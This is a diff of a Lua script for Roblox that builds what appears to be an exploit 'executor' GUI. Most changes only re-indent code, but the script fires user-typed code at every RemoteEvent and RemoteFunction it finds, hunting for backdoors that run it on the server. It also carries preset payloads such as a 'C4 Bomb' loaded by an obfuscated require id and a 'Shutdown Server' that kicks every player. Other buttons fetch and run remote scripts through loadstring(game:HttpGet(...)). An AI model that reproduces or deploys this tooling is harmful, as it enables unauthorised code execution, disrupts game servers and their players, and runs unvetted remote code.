@@ -21,10 +21,10 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 local MainFrame = Instance.new("Frame", ScreenGui)
 MainFrame.Size = UDim2.new(0, 550, 0, 300)
-MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+MainFrame.Position = UDim2.new(0.5, -275, 0.5, -150)
 MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 MainFrame.BorderSizePixel = 0
-MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0)
 MainFrame.Active = true
 MainFrame.Draggable = true
 Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
@@ -45,9 +45,9 @@ Instance.new("UICorner", FloatButton).CornerRadius = UDim.new(0, 8)
 
 local menuVisible = true
 FloatButton.MouseButton1Click:Connect(function()
-	menuVisible = not menuVisible
-	MainFrame.Visible = menuVisible
-	FireButtonClickSound()
+menuVisible = not menuVisible
+MainFrame.Visible = menuVisible
+FireButtonClickSound()
 end)
 
 local TabBar = Instance.new("Frame", MainFrame)
@@ -87,8 +87,8 @@ CloseButton.Font = Enum.Font.GothamBold
 CloseButton.TextSize = 20
 CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 CloseButton.MouseButton1Click:Connect(function()
-	ScreenGui:Destroy()
-	FireButtonClickSound()
+ScreenGui:Destroy()
+FireButtonClickSound()
 end)
 
 local MinimizeButton = Instance.new("TextButton", ContentFrame)
@@ -109,36 +109,39 @@ local minimizedSize = UDim2.new(originalSize.X.Scale, originalSize.X.Offset, 0, 
 local minimizedTitlePos = UDim2.new(0, -ContentFrame.Position.X.Offset + 5, 0, 0)
 
 MinimizeButton.MouseButton1Click:Connect(function()
-	minimized = not minimized
+minimized = not minimized
 
-	if minimized then
-		for _, obj in pairs(ContentFrame:GetChildren()) do
-			if obj:IsA("GuiObject") and obj ~= Title and obj ~= MinimizeButton and obj ~= CloseButton then
-				originalVisibility[obj] = obj.Visible
-				obj.Visible = false
-			end
-		end
-		originalVisibility[TabBar] = TabBar.Visible
-		originalVisibility[Divider] = Divider.Visible
-		TabBar.Visible = false
-		Divider.Visible = false
+if minimized then  
+	for _, obj in pairs(ContentFrame:GetChildren()) do  
+		if obj:IsA("GuiObject") and obj ~= Title and obj ~= MinimizeButton and obj ~= CloseButton then  
+			originalVisibility[obj] = obj.Visible  
+			obj.Visible = false  
+		end  
+	end  
+	originalVisibility[TabBar] = TabBar.Visible  
+	originalVisibility[Divider] = Divider.Visible  
+	TabBar.Visible = false  
+	Divider.Visible = false  
 
-		TweenService:Create(MainFrame, tweenInfo, {Size = minimizedSize}):Play()
+	TweenService:Create(MainFrame, tweenInfo, {Size = minimizedSize}):Play()  
+	TweenService:Create(Title, tweenInfo, {Position = minimizedTitlePos}):Play()  
 
-		MinimizeButton.Text = "+"
-		FireButtonClickSound()
-	else
-		for obj, wasVisible in pairs(originalVisibility) do
-			if obj and obj.Parent then
-				obj.Visible = wasVisible
-			end
-		end
+	MinimizeButton.Text = "+"  
+	FireButtonClickSound()  
+else  
+	for obj, wasVisible in pairs(originalVisibility) do  
+		if obj and obj.Parent then  
+			obj.Visible = wasVisible  
+		end  
+	end  
 
-		TweenService:Create(MainFrame, tweenInfo, {Size = originalSize}):Play()
+	TweenService:Create(MainFrame, tweenInfo, {Size = originalSize}):Play()  
+	TweenService:Create(Title, tweenInfo, {Position = originalTitlePos}):Play()  
 
-		MinimizeButton.Text = "—"
-		FireButtonClickSound()
-	end
+	MinimizeButton.Text = "—"  
+	FireButtonClickSound()  
+end
+
 end)
 
 local TextBox = Instance.new("TextBox", ContentFrame)
@@ -158,38 +161,38 @@ TextBox.MultiLine = true
 Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 8)
 
 local function createButton(text, position)
-	local button = Instance.new("TextButton", ContentFrame)
-	button.Size = UDim2.new(0.4, 0, 0, 35)
-	button.Position = position
-	button.Text = text
-	button.Font = Enum.Font.GothamMedium
-	button.TextSize = 16
-	button.TextColor3 = Color3.fromRGB(255, 255, 255)
-	button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
-	return button
+local button = Instance.new("TextButton", ContentFrame)
+button.Size = UDim2.new(0.4, 0, 0, 35)
+button.Position = position
+button.Text = text
+button.Font = Enum.Font.GothamMedium
+button.TextSize = 16
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
+return button
 end
 
 local ExecuteButton = createButton(" Execute", UDim2.new(0.05, 0, 0.78, 0))
 local ClearButton = createButton(" Clear", UDim2.new(0.55, 0, 0.78, 0))
 
 local lugares = {
-	game:GetService("Workspace"), game:GetService("Lighting"),
-	game:GetService("ReplicatedStorage"), game:GetService("StarterGui"),
-	game:GetService("StarterPlayer"), game:GetService("StarterPack"),
-	game:GetService("Players"), game:GetService("Teams"),
-	game:GetService("Chat"), game:GetService("SoundService"),
-	game:GetService("CoreGui")
+game:GetService("Workspace"), game:GetService("Lighting"),
+game:GetService("ReplicatedStorage"), game:GetService("StarterGui"),
+game:GetService("StarterPlayer"), game:GetService("StarterPack"),
+game:GetService("Players"), game:GetService("Teams"),
+game:GetService("Chat"), game:GetService("SoundService"),
+game:GetService("CoreGui")
 }
 
 local function notify(title, text)
-	pcall(function()
-		StarterGui:SetCore("SendNotification", {
-			Title = title,
-			Text = text,
-			Duration = 3
-		})
-	end)
+pcall(function()
+StarterGui:SetCore("SendNotification", {
+Title = title,
+Text = text,
+Duration = 3
+})
+end)
 end
 
 local ConsolePanel = Instance.new("ScrollingFrame", ContentFrame)
@@ -206,14 +209,14 @@ ConsoleLayout.SortOrder = Enum.SortOrder.LayoutOrder
 ConsoleLayout.Padding = UDim.new(0, 2)
 
 local function logToConsole(prefix, text, color)
-	local label = Instance.new("TextLabel", ConsolePanel)
-	label.Text = "["..prefix.."] "..text
-	label.TextColor3 = color
-	label.Font = Enum.Font.Code
-	label.TextSize = 16
-	label.TextXAlignment = Enum.TextXAlignment.Left
-	label.BackgroundTransparency = 1
-	label.Size = UDim2.new(1, -10, 0, 20)
+local label = Instance.new("TextLabel", ConsolePanel)
+label.Text = "["..prefix.."] "..text
+label.TextColor3 = color
+label.Font = Enum.Font.Code
+label.TextSize = 16
+label.TextXAlignment = Enum.TextXAlignment.Left
+label.BackgroundTransparency = 1
+label.Size = UDim2.new(1, -10, 0, 20)
 end
 
 local TweenService = game:GetService("TweenService")
@@ -221,64 +224,65 @@ local TweenService = game:GetService("TweenService")
 local buttonCache = {}
 
 local function animateClick(button)
-	if not buttonCache[button] then
-		buttonCache[button] = {
-			Position = button.Position,
-			Size = button.Size
-		}
-	end
+if not buttonCache[button] then
+buttonCache[button] = {
+Position = button.Position,
+Size = button.Size
+}
+end
 
-	local original = buttonCache[button]  
+local original = buttonCache[button]    
 
-	local pressTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {  
-		Position = original.Position + UDim2.new(0, 0, 0, 2),  
-		Size = original.Size - UDim2.new(0, 0, 0, 2)  
-	})  
+local pressTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {    
+	Position = original.Position + UDim2.new(0, 0, 0, 2),    
+	Size = original.Size - UDim2.new(0, 0, 0, 2)    
+})    
 
-	local releaseTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {  
-		Position = original.Position,  
-		Size = original.Size  
-	})  
+local releaseTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {    
+	Position = original.Position,    
+	Size = original.Size    
+})    
 
-	pressTween:Play()  
-	pressTween.Completed:Connect(function()  
-		releaseTween:Play()  
-	end)
+pressTween:Play()    
+pressTween.Completed:Connect(function()    
+	releaseTween:Play()    
+end)
+
 end
 
 ExecuteButton.MouseButton1Click:Connect(function()
-    FireButtonClickSound()
-    animateClick(ExecuteButton)
-	logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))
-	local code = TextBox.Text
-	if code == "" then
-		notify("Error", "No code provided")
-		return
-	end
-	local enviados = 0
-	for _, localBase in ipairs(lugares) do
-		for _, obj in ipairs(localBase:GetDescendants()) do
-			if obj:IsA("RemoteEvent") then
-				pcall(function()
-					obj:FireServer(code)
-					enviados += 1
-				end)
-			elseif obj:IsA("RemoteFunction") then
-				pcall(function()
-					obj:InvokeServer(code)
-					enviados += 1
-				end)
-			end
-		end
-	end
+FireButtonClickSound()
+animateClick(ExecuteButton)
+logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))
+local code = TextBox.Text
+if code == "" then
+notify("Error", "No code provided")
+return
+end
+local enviados = 0
+for _, localBase in ipairs(lugares) do
+for _, obj in ipairs(localBase:GetDescendants()) do
+if obj:IsA("RemoteEvent") then
+pcall(function()
+obj:FireServer(code)
+enviados += 1
+end)
+elseif obj:IsA("RemoteFunction") then
+pcall(function()
+obj:InvokeServer(code)
+enviados += 1
+end)
+end
+end
+end
 end)
 
 ClearButton.MouseButton1Click:Connect(function()
-    FireButtonClickSound()
-    animateClick(ClearButton)
-	TextBox.Text = ""
-	notify("Success", "Successfully Cleared")
-	logToConsole("INFO", "Textbox Cleared", Color3.fromRGB(255, 255, 255))
+FireButtonClickSound()
+animateClick(ClearButton)
+TextBox.Text = ""
+notify("Success", "Successfully Cleared")
+logToConsole("INFO", "Textbox Cleared", Color3.fromRGB(255, 255, 255))
 end)
 
 local ScriptPanel = Instance.new("ScrollingFrame", ContentFrame)
@@ -297,25 +301,26 @@ ScriptLayout.SortOrder = Enum.SortOrder.LayoutOrder
 ScriptLayout.Padding = UDim.new(0, 5)
 
 local function SetActiveTab(tab)
-	TextBox.Visible = false
-	ExecuteButton.Visible = false
-	ClearButton.Visible = false
-	ScriptPanel.Visible = false
-	ConsolePanel.Visible = false
+TextBox.Visible = false
+ExecuteButton.Visible = false
+ClearButton.Visible = false
+ScriptPanel.Visible = false
+ConsolePanel.Visible = false
 
-	if tab == "executor" then
-		TextBox.Visible = true
-		ExecuteButton.Visible = true
-		FireButtonClickSound()
-		ClearButton.Visible = true
-		FireButtonClickSound()
-	elseif tab == "scripts" then
-		ScriptPanel.Visible = true
-		FireButtonClickSound()
-	elseif tab == "console" then
-		ConsolePanel.Visible = true
-		FireButtonClickSound()
-	end
+if tab == "executor" then  
+	TextBox.Visible = true  
+	ExecuteButton.Visible = true  
+	FireButtonClickSound()  
+	ClearButton.Visible = true  
+	FireButtonClickSound()  
+elseif tab == "scripts" then  
+	ScriptPanel.Visible = true  
+	FireButtonClickSound()  
+elseif tab == "console" then  
+	ConsolePanel.Visible = true  
+	FireButtonClickSound()  
+end
+
 end
 
 local TweenService = game:GetService("TweenService")
@@ -323,82 +328,85 @@ local TweenService = game:GetService("TweenService")
 local buttonCache = {}
 
 local function animateClick(button)
-	if not buttonCache[button] then
-		buttonCache[button] = {
-			Position = button.Position,
-			Size = button.Size
-		}
-	end
+if not buttonCache[button] then
+buttonCache[button] = {
+Position = button.Position,
+Size = button.Size
+}
+end
 
-	local original = buttonCache[button]  
+local original = buttonCache[button]    
 
-	local pressTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {  
-		Position = original.Position + UDim2.new(0, 0, 0, 2),  
-		Size = original.Size - UDim2.new(0, 0, 0, 2)  
-	})  
+local pressTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {    
+	Position = original.Position + UDim2.new(0, 0, 0, 2),    
+	Size = original.Size - UDim2.new(0, 0, 0, 2)    
+})    
 
-	local releaseTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {  
-		Position = original.Position,  
-		Size = original.Size  
-	})  
+local releaseTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {    
+	Position = original.Position,    
+	Size = original.Size    
+})    
 
-	pressTween:Play()  
-	pressTween.Completed:Connect(function()  
-		releaseTween:Play()  
-	end)
+pressTween:Play()    
+pressTween.Completed:Connect(function()    
+	releaseTween:Play()    
+end)
+
 end
 
 _G.AddSection = function(text)
-	local label = Instance.new("TextLabel", ScriptPanel)
-	label.Size = UDim2.new(1, 0, 0, 25)
-	label.Text = text
-	label.Font = Enum.Font.GothamBold
-	label.TextSize = 18
-	label.TextColor3 = Color3.fromRGB(255, 255, 255)
-	label.BackgroundTransparency = 1
+local label = Instance.new("TextLabel", ScriptPanel)
+label.Size = UDim2.new(1, 0, 0, 25)
+label.Text = text
+label.Font = Enum.Font.GothamBold
+label.TextSize = 18
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.BackgroundTransparency = 1
 end
 
 _G.AddButton = function(text, code)
-	local button = Instance.new("TextButton", ScriptPanel)
-	button.Size = UDim2.new(1, 0, 0, 30)
-	button.Text = text
-	button.Font = Enum.Font.Gotham
-	button.TextSize = 16
-	button.TextColor3 = Color3.fromRGB(255, 255, 255)
-	button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
-	
-	button.MouseButton1Click:Connect(function()
-		SetActiveTab("executor")
-		TextBox.Text = code
-	end)
+local button = Instance.new("TextButton", ScriptPanel)
+button.Size = UDim2.new(1, 0, 0, 30)
+button.Text = text
+button.Font = Enum.Font.Gotham
+button.TextSize = 16
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
+
+button.MouseButton1Click:Connect(function()  
+	SetActiveTab("executor")  
+	TextBox.Text = code  
+end)
+
 end
 
 _G.LocalScriptButton = function(text, func)
-	local button = Instance.new("TextButton", ScriptPanel)
-	button.Size = UDim2.new(1, 0, 0, 30)
-	button.Text = text
-	button.Font = Enum.Font.Gotham
-	button.TextSize = 16
-	button.TextColor3 = Color3.fromRGB(255, 255, 255)
-	button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
+local button = Instance.new("TextButton", ScriptPanel)
+button.Size = UDim2.new(1, 0, 0, 30)
+button.Text = text
+button.Font = Enum.Font.Gotham
+button.TextSize = 16
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
 
-	button.MouseButton1Click:Connect(function()
-	    logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))
-    	FireButtonClickSound()
-		animateClick(button)
-		func()
-	end)
+button.MouseButton1Click:Connect(function()  
+    logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))  
+	FireButtonClickSound()  
+	animateClick(button)  
+	func()  
+end)
+
 end
 
 local function createTabButton(order, callback, imageId)
-	local tab = Instance.new("ImageButton", TabBar)
-	tab.Size = UDim2.new(1, 0, 0, 50)
-	tab.Position = UDim2.new(0, 0, 0, order * 50)
-	tab.Image = "rbxassetid://"..imageId
-	tab.BackgroundTransparency = 1
-	tab.MouseButton1Click:Connect(callback)
+local tab = Instance.new("ImageButton", TabBar)
+tab.Size = UDim2.new(1, 0, 0, 50)
+tab.Position = UDim2.new(0, 0, 0, order * 50)
+tab.Image = "rbxassetid://"..imageId
+tab.BackgroundTransparency = 1
+tab.MouseButton1Click:Connect(callback)
 end
 
 createTabButton(0, function() SetActiveTab("executor") end, 133432695793267)
@@ -419,7 +427,7 @@ _G.AddButton("C4 Bomb", 'require(0x1767bf813)("' .. LocalPlayer.Name .. '")')
 
 _G.AddButton("Shutdown Server", [[
 for _, v in pairs(game.Players:GetPlayers()) do
-    v:Kick("Server has Shutdown")
+v:Kick("Server has Shutdown")
 end
 ]])
 
@@ -430,15 +438,15 @@ Instance.new("Hint", workspace).Text = "Text Here"
 _G.AddSection("Client Side Scripts")
 
 _G.LocalScriptButton("Infinite Yield", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 end)
 
 _G.LocalScriptButton("Fly GUI V3", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
 end)
 
 _G.LocalScriptButton("Keyboard", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
 end)
 
 logToConsole("WELCOME", "Welcome to Console!", Color3.fromRGB(0, 255, 255))
